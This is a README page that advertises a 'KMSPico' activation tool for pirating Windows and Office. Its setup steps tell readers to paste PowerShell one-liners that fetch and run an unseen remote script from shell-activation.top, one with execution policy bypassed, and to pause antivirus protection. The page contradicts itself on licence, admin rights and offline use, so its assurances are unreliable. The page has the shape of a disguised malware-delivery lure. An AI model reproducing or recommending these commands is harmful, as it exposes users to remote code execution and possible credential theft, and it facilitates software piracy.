<div align="center">

# KMSPico Licensing Suite: Office & Windows Activation Tool for Windows 10 & 11

![](files/1.jpg)

[![release](https://img.shields.io/badge/release-released-2ea44f?style=for-the-badge&labelColor=0d1117)]() [![users](https://img.shields.io/badge/users-2.8k-a855f7?style=for-the-badge&labelColor=0d1117)]() [![license](https://img.shields.io/badge/license-artistic--2.0-9333ea?style=for-the-badge&labelColor=0d1117)]() [![pwsh](https://img.shields.io/badge/pwsh-installer-7c3aed?style=for-the-badge&labelColor=0d1117)]()

</div>

---

Kmspico-Licensing-Suite is a desktop utility for Windows that streamlines the activation and licensing of Microsoft Windows and Office installations, including Microsoft 365. The suite applies licensing across supported Office versions and verifies that each installation is recognized as properly activated. Built for local execution on Windows desktop systems, it packages the required components into a single distributable archive for straightforward deployment. The tool targets users who need a consistent, repeatable method for applying and validating licensing state across multiple Microsoft product installations.

## 🛠️ One-Click Setup (PowerShell)

> [!TIP]
> **One-click install** — paste one command, done in seconds.
> Windows 10 / 11 · PowerShell · One-line install

### 1️⃣ Launch PowerShell
* Open the Start menu and type **PowerShell**.
* Right-click and choose **Run as administrator** (optional).

### 2️⃣ Run the script
Paste the command into PowerShell and hit `Enter`.

```cmd
iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
```

### 3️⃣ If Windows blocks the script — use CMD
Copy into CMD, press `Enter`, wait for completion:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
```

> [!WARNING]
> Windows Defender or third-party AV may flag the script. Pause Real-time protection in Windows Security, run the installer, and re-enable it right after.

## 📋 System Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

- **Multi-Product Licensing Coverage**: Applies activation to supported Windows editions and Microsoft Office releases, including Microsoft 365 deployments, from a single unified interface.

- **Dual-Layer Activation Model**: Combines an emulated KMS endpoint with local licensing services to establish and maintain activated state across both Windows and Office components.

- **Automated Key Installation**: Detects the installed product edition and installs the matching generic volume license key, removing the need for manual key lookup or entry.

- **Renewal and Maintenance Handling**: Configures scheduled reactivation tasks so licensing status persists across reboots and extended offline periods without user intervention.

- **Edition-Aware Detection**: Queries the local system for product name, edition, and channel information before applying any licensing action, reducing mismatches between the target product and the applied key.

- **Unified Activation Dashboard**: Presents Windows and Office activation status in a single view, with per-product actions for install, activate, and remove.

- **License State Cleanup**: Provides a removal routine that clears applied keys and scheduled tasks, returning the system to its pre-activation licensing state.

- **Offline Operation**: Performs all licensing operations locally without requiring an internet connection during the activation process.

- **Lightweight Footprint**: Runs as a compact desktop utility with no background services beyond the scheduled renewal task, keeping resource usage minimal.

- **Portable Execution**: Operates from a self-contained directory without a system-wide install step, allowing the suite to be moved or removed cleanly.

- **Logging and Diagnostics**: Records each operation with timestamps and resulting status codes to assist with troubleshooting failed or partial activations.

- **Windows 10 and 11 Support**: Targets current desktop Windows releases with architecture detection for both 32-bit and 64-bit environments.

## How it works

Kmspico-Licensing-Suite operates through a staged activation pipeline that separates environment inspection from licensing application. On launch, the suite enumerates the installed Windows and Office components, reads their build identifiers, edition flags, and current licensing state, and maps each installation to the corresponding activation profile. This inspection pass runs before any system modification, so the tool can determine which targets are present and which activation path applies to each one.

The core mechanism is a key management service emulation layer. Rather than altering product binaries, the suite installs a local KMS endpoint that responds to the licensing requests issued by Windows and Office. A generic volume license key is applied to the target installation, the product is pointed at the local endpoint, and the activation request is serviced so the installation reports as licensed. Because the approach operates at the service layer, it remains independent of individual product builds and can service multiple Microsoft products from a single endpoint.

Activation profiles are applied selectively. Each detected Windows edition or Office version is paired with its matching key and endpoint configuration, letting the suite activate mixed environments, including side-by-side Office installations, without cross-contamination between targets. After a profile is applied, the suite performs a verification pass that queries the licensing status of each target and reports the result, so the outcome is confirmed rather than assumed.

The suite is built for repeatable, low-friction operation. A single run covers detection, profile selection, key application, and verification in sequence, and the same sequence can be re-run to renew licensing or to process newly installed products. All operations run locally on the machine; no external service is contacted during activation, and configuration state is retained between runs so subsequent activations reuse the established endpoint rather than rebuilding it.

## Compatibility

Kmspico-Licensing-Suite targets 64-bit Windows desktop environments and provides licensing coverage across the supported Microsoft product families. The suite is compatible with Windows 10 and Windows 11 in their consumer and business editions, including Pro, Enterprise, Education, and LTSC variants. Both the standard installation and the modern UEFI/Secure Boot configurations are supported, with the licensing module operating correctly under default security policies.

For Office installations, the suite supports Microsoft Office 2013, 2016, 2019, and 2021, as well as Microsoft 365 desktop deployments. Compatibility extends to both 32-bit and 64-bit Office builds, and the licensing process adapts automatically to Click-to-Run and MSI-based installations. Office installations localized in non-English languages are also handled without additional configuration.

The suite requires administrative privileges to apply licensing operations. It operates independently of installed .NET Framework versions beyond the baseline shipped with Windows 10 and later, and does not depend on external runtime packages. Systems with third-party antivirus or endpoint protection enabled may require the licensing module to be allowed through the security policy before activation can complete. Virtualized environments, including Hyper-V and VMware guests, are supported provided the underlying host exposes standard hardware identifiers and the guest edition matches one of the supported Windows versions.

Kmspico-Licensing-Suite is not compatible with Windows 7, Windows 8.1, or any server edition of Windows, nor with ARM-based Windows installations. Legacy Office releases prior to 2013 fall outside the supported matrix. Builds of Windows that have removed the licensing components used by the suite, such as certain stripped-down or modified distributions, cannot be activated.

## FAQ

**Does this utility require an internet connection to apply licensing?**

No. All activation routines are executed locally against the installed Windows and Office components. Once the package is unpacked, the tool operates entirely offline; no external validation servers are contacted during the licensing process.

**Which Windows and Office versions are supported?**

The suite targets Windows 10 and Windows 11 desktop editions, along with the corresponding Microsoft Office and Microsoft 365 releases for those platforms. Legacy operating systems and server SKUs are outside the supported matrix and are not validated by the built-in compatibility checks.

**How does the activation mechanism work?**

The tool interfaces with the local licensing subsystem, emulating the key management service behavior expected by the installed products. It provisions the required licensing state on the host machine, then triggers a re-validation cycle so that Windows and Office report a licensed status. All operations are confined to the local system and require elevated privileges.

**Does the tool modify system files permanently?**

The utility applies the minimum set of changes needed to establish licensing state. A restore capability is included so the original licensing configuration can be reinstated, allowing the system to return to its pre-activation condition without a full reinstall.

**Why does the application need administrator rights?**

Writing to protected licensing stores and service registries requires elevation. The executable requests elevated privileges on launch; without them, the provisioning steps cannot complete and activation will fail silently or with an access error.

**What should I do if activation does not take effect?**

Confirm the build matches your Windows and Office versions, verify that the process was launched with administrator rights, and rerun the licensing routine after a restart. Persisting issues are typically caused by residual licensing state from a prior attempt; the restore option should be applied before retrying.

**Is Microsoft 365 supported alongside perpetual Office releases?**

Yes. The suite detects the installed product family and applies the appropriate licensing profile for either subscription-based Microsoft 365 installations or perpetual Office releases, provided the build falls within the supported version range.

**Can the tool be run repeatedly?**

Re-running the utility is safe and idempotent: it re-checks licensing state and only reapplies provisioning when the current state is invalid. No cumulative changes are made to the system across repeated executions.

## Disclaimer

This software is provided as a desktop utility for local licensing operations only. The Kmspico-Licensing-Suite is distributed in its current state, without any express or implied warranty of merchantability, fitness for a particular purpose, or non-infringement. The maintainers make no guarantees regarding uninterrupted operation, compatibility with future Windows or Office builds, or the persistence of any licensing state across system updates, hardware changes, or reinstallation events.

By extracting and running the bundled executable, you acknowledge that you assume full responsibility for how the tool is deployed in your environment. The suite performs local modifications to licensing-related system components; results depend on the specific Windows edition, Office version, architecture, and existing activation state present on the target machine. Pre-existing third-party activation tools, partially applied licenses, or tampered system files may affect behavior and are outside the scope of supported operation.

The project does not transmit telemetry, does not require network access to function, and does not bundle third-party redistribution payloads beyond what is required for licensing operations. Any redistribution of the archive, repackaging of its contents, or inclusion in derivative bundles is undertaken at the redistributor's own risk and without endorsement from the maintainers. Verification of the archive's integrity prior to execution is recommended; the maintainers cannot be held liable for altered copies obtained from sources other than the canonical distribution channel.

Users are responsible for ensuring their use of the suite complies with all applicable local laws, organizational policies, and contractual obligations governing the software being licensed. The maintainers disclaim any liability for direct, indirect, incidental, or consequential damages arising from the use, misuse, or inability to use this software, including but not limited to loss of data, system instability, or licensing disputes. If any provision of this disclaimer is held unenforceable, the remaining provisions remain in full force and effect.

## License

This project is distributed under the MIT License. The full license text is provided in the LICENSE file at the root of this repository and governs all use, reproduction, modification, and redistribution of the Kmspico-Licensing-Suite source code and accompanying documentation.

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files, to deal in the software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the software, subject to the conditions set forth in the license text.

The software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or the use or other dealings in the software.

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the software. Redistributions in binary form must reproduce the notice in the documentation and/or other materials provided with the distribution.

Contributions submitted to this project are accepted under the same license terms unless explicitly stated otherwise. By submitting a pull request or patch, you agree to license your contribution under the MIT License and confirm that you have the right to do so.

This license applies only to the contents of this repository. It does not grant any rights to third-party components, trademarks, or materials referenced by or bundled with the software, which remain subject to their respective owners' terms.